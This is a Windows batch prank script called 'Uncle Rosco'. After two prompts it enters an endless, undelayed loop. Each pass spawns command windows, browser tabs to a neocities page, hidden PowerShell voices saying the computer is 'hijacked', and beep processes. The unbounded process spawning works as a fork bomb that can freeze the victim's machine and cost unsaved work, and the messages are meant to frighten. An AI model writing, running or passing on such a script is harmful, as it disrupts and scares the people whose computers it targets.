@echo off
title UNCLE ROSCO HAS ARRIVED
echo Press Enter
pause >nul

echo My name is Uncle Rosco. What is yours???
set /p name=What's your name?
echo Heh heh heh, nice to meetcha, big boy...
pause >nul
echo Now... press Enter again :)
pause >nul

:loop
:: Spam CMD windows (no beep here)
start "" cmd /c "title UNCLE_ROSCO_CAUGHT_YOU & color CF & echo UncleRoscoCaughtU"

:: Spam browser tabs
start "" https://uncleroscohascaughtyou.neocities.org/
start "" https://uncleroscohascaughtyou.neocities.org/

:: Overlapping TTS
start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Your computer has been hijacked by Uncle Rosco')"
start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Uncle Rosco is in your walls')"

:: Overlapping beeps (separate PowerShell processes)
start "" powershell -WindowStyle Hidden -Command "[console]::beep(1000,300)"

:: No delay = total chaos
goto loop


